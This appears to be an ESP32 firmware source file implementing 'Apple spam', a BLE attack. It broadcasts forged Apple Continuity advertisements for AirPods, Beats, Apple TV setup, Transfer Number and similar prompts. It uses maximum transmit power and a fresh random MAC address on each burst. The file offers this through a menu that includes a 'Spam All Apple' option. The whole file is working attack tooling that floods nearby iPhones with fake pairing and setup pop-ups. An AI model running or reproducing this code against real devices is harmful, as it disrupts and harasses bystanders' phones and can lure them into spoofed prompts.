#include "apple_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "esp_mac.h"
#include <globals.h>

#if !defined(LITE_VERSION)

extern void generateRandomMac(uint8_t *mac);

// Apple payload data
static const uint8_t data_airpods[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa,
                                       0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_airpods_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa,
                                           0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_airpods_max[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa,
                                           0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_airpods_gen2[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa,
                                            0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_airpods_gen3[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa,
                                            0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_airpods_pro_gen2[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa,
                                                0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_beats_solo_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa,
                                              0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_beats_studio_buds[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa,
                                                 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_beats_fit_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa,
                                             0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_beats_studio_buds_plus[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa,
                                                      0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_apple_tv_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                              0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
                                              0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_setup_new_phone[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                               0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c,
                                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_transfer_number[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                               0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c,
                                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_tv_color_balance[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c,
                                                0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_vision_pro[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
                                          0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_apple_tv_connecting[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                   0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c,
                                                   0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_apple_tv_audio_sync[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                   0x00, 0x0f, 0x05, 0xc1, 0x19, 0x60, 0x4c,
                                                   0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_setup_new_apple_tv[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                  0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
                                                  0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_homepod_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
                                             0x0B, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_homekit_apple_tv_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                      0x00, 0x0f, 0x05, 0xc1, 0x0D, 0x60, 0x4c,
                                                      0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_pair_apple_tv[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
                                             0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_setup_new_ipad[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                              0x00, 0x0f, 0x05, 0x40, 0x09, 0x60, 0x4c,
                                              0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

static const ApplePayload apple_payloads[] = {
    {"AirPods",            data_airpods,                sizeof(data_airpods)               },
    {"AirPods Pro",        data_airpods_pro,            sizeof(data_airpods_pro)           },
    {"AirPods Max",        data_airpods_max,            sizeof(data_airpods_max)           },
    {"AirPods Gen 2",      data_airpods_gen2,           sizeof(data_airpods_gen2)          },
    {"AirPods Gen 3",      data_airpods_gen3,           sizeof(data_airpods_gen3)          },
    {"AirPods Pro Gen 2",  data_airpods_pro_gen2,       sizeof(data_airpods_pro_gen2)      },
    {"Beats Solo Pro",     data_beats_solo_pro,         sizeof(data_beats_solo_pro)        },
    {"Beats Studio Buds",  data_beats_studio_buds,      sizeof(data_beats_studio_buds)     },
    {"Beats Fit Pro",      data_beats_fit_pro,          sizeof(data_beats_fit_pro)         },
    {"Beats Studio Buds+", data_beats_studio_buds_plus, sizeof(data_beats_studio_buds_plus)},
    {"AppleTV Setup",      data_apple_tv_setup,         sizeof(data_apple_tv_setup)        },
    {"Setup New Phone",    data_setup_new_phone,        sizeof(data_setup_new_phone)       },
    {"Transfer Number",    data_transfer_number,        sizeof(data_transfer_number)       },
    {"TV Color Balance",   data_tv_color_balance,       sizeof(data_tv_color_balance)      },
    {"Apple Vision Pro",   data_vision_pro,             sizeof(data_vision_pro)            },
    {"AppleTV Connecting", data_apple_tv_connecting,    sizeof(data_apple_tv_connecting)   },
    {"AppleTV Audio Sync", data_apple_tv_audio_sync,    sizeof(data_apple_tv_audio_sync)   },
    {"Setup New AppleTV",  data_setup_new_apple_tv,     sizeof(data_setup_new_apple_tv)    },
    {"HomePod Setup",      data_homepod_setup,          sizeof(data_homepod_setup)         },
    {"HomeKit AppleTV",    data_homekit_apple_tv_setup, sizeof(data_homekit_apple_tv_setup)},
    {"Pair AppleTV",       data_pair_apple_tv,          sizeof(data_pair_apple_tv)         },
    {"Setup New iPad",     data_setup_new_ipad,         sizeof(data_setup_new_ipad)        }
};

static const int apple_payload_count = sizeof(apple_payloads) / sizeof(ApplePayload);
static bool apple_spam_running = false;
static int current_apple_payload = -1;
static BLEAdvertising *pAppleAdvertising = nullptr;

// State machine variables
static enum {
    APPLE_IDLE,
    APPLE_ADVERTISING,
    APPLE_WAITING
} apple_state = APPLE_IDLE;
static unsigned long apple_state_start_ms = 0;
static unsigned long apple_adv_duration_ms = 100;
static unsigned long apple_burst_interval_ms = 200;
static bool ble_initialized = false;

int getApplePayloadCount() { return apple_payload_count; }

const char *getApplePayloadName(int index) {
    if (index < 0 || index >= apple_payload_count) return "Unknown";
    return apple_payloads[index].name;
}

bool isAppleSpamRunning() { return apple_spam_running; }

static bool initBLE() {
    if (ble_initialized) return true;
    
    if (!NimBLEDevice::isInitialized()) {
        NimBLEDevice::init("");
    }
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    
    pAppleAdvertising = NimBLEDevice::getAdvertising();
    if (!pAppleAdvertising) return false;
    
    pAppleAdvertising->setMinInterval(32);
    pAppleAdvertising->setMaxInterval(48);
    pAppleAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    
    ble_initialized = true;
    return true;
}

void stopAppleSpam() {
    if (!apple_spam_running) return;

    apple_spam_running = false;
    apple_state = APPLE_IDLE;

    if (pAppleAdvertising && pAppleAdvertising->isAdvertising()) {
        pAppleAdvertising->stop();
    }
    
    current_apple_payload = -1;
}

void quickAppleSpam(int payloadIndex) {
    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return;

    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);

    BLEDevice::init("");
    BLEAdvertising *pAdv = BLEDevice::getAdvertising();

    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x06);

    uint8_t fullPayload[31];
    fullPayload[0] = apple_payloads[payloadIndex].length + 1;
    fullPayload[1] = 0xFF;
    memcpy(&fullPayload[2], apple_payloads[payloadIndex].data, apple_payloads[payloadIndex].length);

#ifdef NIMBLE_V2_PLUS
    advertisementData.addData(fullPayload, apple_payloads[payloadIndex].length + 2);
#else
    std::vector<uint8_t> payloadVector(fullPayload, fullPayload + apple_payloads[payloadIndex].length + 2);
    advertisementData.addData(payloadVector);
#endif

    pAdv->setAdvertisementData(advertisementData);
    pAdv->setScanResponseData(BLEAdvertisementData());
    pAdv->setMinInterval(32);
    pAdv->setMaxInterval(48);
    pAdv->start();
    vTaskDelay(100 / portTICK_PERIOD_MS);
    pAdv->stop();
    vTaskDelay(5 / portTICK_PERIOD_MS);

#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

void startAppleSpamAll() {
    if (apple_spam_running) stopAppleSpam();
    startAppleSpam(0);
}

void startAppleSpam(int payloadIndex) {
    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return;
    if (apple_spam_running) stopAppleSpam();

    if (!initBLE()) return;

    current_apple_payload = payloadIndex;
    apple_spam_running = true;
    apple_state = APPLE_ADVERTISING;
    apple_state_start_ms = millis();

    drawMainBorderWithTitle(apple_payloads[payloadIndex].name);
    padprintln("");
    padprintln("Press ESC to stop");
}

void updateAppleSpam() {
    if (!apple_spam_running) return;
    
    unsigned long now = millis();
    
    switch (apple_state) {
        case APPLE_ADVERTISING:
            if (now - apple_state_start_ms >= apple_adv_duration_ms) {
                if (pAppleAdvertising && pAppleAdvertising->isAdvertising()) {
                    pAppleAdvertising->stop();
                }
                apple_state = APPLE_WAITING;
                apple_state_start_ms = now;
            }
            break;
            
        case APPLE_WAITING:
            if (now - apple_state_start_ms >= apple_burst_interval_ms) {
                uint8_t macAddr[6];
                generateRandomMac(macAddr);
                esp_base_mac_addr_set(macAddr);
                
                BLEAdvertisementData advertisementData = BLEAdvertisementData();
                advertisementData.setFlags(0x06);
                
                uint8_t fullPayload[31];
                fullPayload[0] = apple_payloads[current_apple_payload].length + 1;
                fullPayload[1] = 0xFF;
                memcpy(&fullPayload[2], apple_payloads[current_apple_payload].data, 
                       apple_payloads[current_apple_payload].length);
                
#ifdef NIMBLE_V2_PLUS
                advertisementData.addData(fullPayload, apple_payloads[current_apple_payload].length + 2);
#else
                std::vector<uint8_t> payloadVector(fullPayload, fullPayload + apple_payloads[current_apple_payload].length + 2);
                advertisementData.addData(payloadVector);
#endif
                
                pAppleAdvertising->setAdvertisementData(advertisementData);
                pAppleAdvertising->start();
                
                displayTextLine(String(apple_payloads[current_apple_payload].name) + " " + String(now / 1000) + "s");
                apple_state = APPLE_ADVERTISING;
                apple_state_start_ms = now;
            }
            break;
            
        default:
            break;
    }
    
    if (check(EscPress)) {
        stopAppleSpam();
        returnToMenu = true;
    }
}

void appleSubMenu() {
    std::vector<Option> appleOptions;

    appleOptions.push_back({"Spam All Apple", []() { startAppleSpamAll(); }});

    for (int i = 0; i < apple_payload_count; i++) {
        appleOptions.push_back({apple_payloads[i].name, [i]() { startAppleSpam(i); }});
    }

    appleOptions.push_back({"Back", []() { returnToMenu = true; }});

    loopOptions(appleOptions, MENU_TYPE_SUBMENU, "Apple Spam");
}

#endif
